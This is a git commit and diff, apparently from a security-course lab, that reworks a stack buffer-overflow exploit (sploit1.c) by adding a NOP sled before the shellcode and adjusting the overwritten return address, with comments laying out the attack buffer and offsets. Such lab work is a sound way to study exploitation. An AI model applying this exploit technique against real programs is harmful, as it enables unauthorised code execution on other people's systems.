45575a7423abc837a910a8469375df93be2507a5
Benjamin Cheng <ben@bcheng.me>
2022-09-19 16:09:03 -0400

    lab1/sploit1: reorganize attack buffer
    Adds NOP padding so that we can set the return address to something
    inside the buffer. This way it is more likely to succeed on more
    platforms.

--- lab1/sploits/sploit1.c
+++ lab1/sploits/sploit1.c
@@ -13,17 +13,26 @@ main ( int argc, char * argv[] )
     char *    args[3];
     char *    env[1];
 
-    uint8_t input[370];
     /* return address lives at $rbp + 8
-     * ($rbp + 8) - buf = 0x158 = 344 */
-    memcpy(input, shellcode, sizeof(shellcode));
-    for (int i = sizeof(shellcode) - 1; i < 344; i++) {
-        input[i] = i % 254 + 1;
+     * ($rbp + 8) - buf = 0x158 = 344
+     *
+     * the attack buffer will look like:
+     * - 40 bytes: NOP (0x90)
+     * - 52 bytes: shellcode
+     * - 252 bytes: padding
+     * - 8 bytes: RA
+     * - 1 byte: null-termination
+     */
+    uint8_t input[370];
+    memset(input, 0x90, 40);
+    memcpy(&input[40], shellcode, sizeof(shellcode));
+    for (int i = sizeof(shellcode) - 1; i < 344 - 40; i++) {
+        input[i + 40] = i % 254 + 1;
     }
 
     /* TODO: figure out how to write the high 4 bytes of zero */
     uint64_t *return_address = (uint64_t *) &input[344];
-    *return_address = 0x40A4FD50;
+    *return_address = 0x40A4FD70;
     input[348] = 0x7f;
     input[349] = 0x00;
 
